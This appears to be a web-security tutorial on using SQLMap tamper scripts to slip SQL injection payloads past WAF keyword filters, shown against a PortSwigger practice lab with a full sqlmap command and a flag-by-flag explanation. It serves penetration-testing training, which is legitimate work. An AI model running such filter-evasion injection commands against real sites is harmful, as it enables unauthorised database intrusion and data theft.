<h1>SQLMap Tamper Scripts To Bypass Character Filtering Restrictions - FOR EDUCATIONAL PURPOSES ONLY</h1>

Sometimes, certain characters and keywords are blocked by Web Application Firewalls, or custom filters in order to protect against injection based attacks, such as SQL Injection. Keywords like
<mark>SELECT</mark> or <mark>UNION</mark>, or certain sequences of characters such as '<mark>--</mark>' are often blocked because they look like SQL Injection attacks. Lucky for us, SQLMap has tamper scripts that can help
us bypass filtering restrictions.

<mark>SEE LIST OF TAMPER SCRIPTS AT:</mark> https://github.com/dante-falls/Web-Security/blob/main/Server-Side_Vulnerabilities/SQL_Injection/SQLMap_Tamper_Scripts.txt 

OR run the following on the command line:

```
sqlmap --list-tampers
```


<h1>Example Useage Of SQLMap Tamper Scripts</h1>
Lets try to use SQLMap tamper scripts to obfuscate our payloads and successfully identify a Time-Based SQL Injection in a purposefully vulnerable machine on Portswigger. We'll be using the following lab to
show our Proof Of Concept: https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text

<h3>In our lab, we will be testing the 'category' parameter for SQL Injection. See Image Below
</h3>

<img width="1909" height="700" alt="10-17-2025-catergory-param-sqli-lab" src="https://github.com/user-attachments/assets/569f8af1-b046-4138-aa2b-07f03a53fdc8" />



<h3>Here Is The SQLMap command we will be using</h3>


sqlmap -u 'https://0a0e00e00384b00d8019766c000600fd.web-security-academy.net/filter?category=Gifts' -p category --tamper=randomcase,sleep2getlock,space2dash,charencode --technique=T --dbms=postgresql -level 3 -risk 3 --proxy='http://127.0.0.1:8080' --batch --flush-session

-p - test the category parameter

--tamper-script - use randomcase, sleep2getlock, space2dash, charencode tamper scripts

--technique - T = only use Time-Based payloads

--dbms - specify the backend database as postgresql

-level - specify level of tests to perform

-risk - specify risk of tests to perform

--proxy - send all requests to my burpsuite proxy located at 127.0.0.1:8080

--batch - tell sqlmap to not ask for user input and just choose the default option

--flush-sesion - flush session files for current target

Analyze the image below where we start running SQLMap against the Portswigger lab target

<img width="1896" height="764" alt="10-17-2025-starting-it-up" src="https://github.com/user-attachments/assets/f19cac52-b35f-46b6-8125-0832c0227d51" />

<h3>SQLMap Quickly Identifies A Time-Based Payload in the 'category' parameter</h3>

SQLMap quickly identified a Time-Based Payload that successfully caused a delay in the server response and proved successful SQL Injection. See Image Below

<img width="1895" height="514" alt="10-17-2025-time-based-identified" src="https://github.com/user-attachments/assets/7a74336b-0388-4007-b49c-397280f91c33" />


<h1>MAKE SURE YOU VERIFY THAT THE PAYLOAD ACTUALLY CAUSES A DELAY, IT MIGHT STILL BE A FALSE POSITIVE!!!</h1>




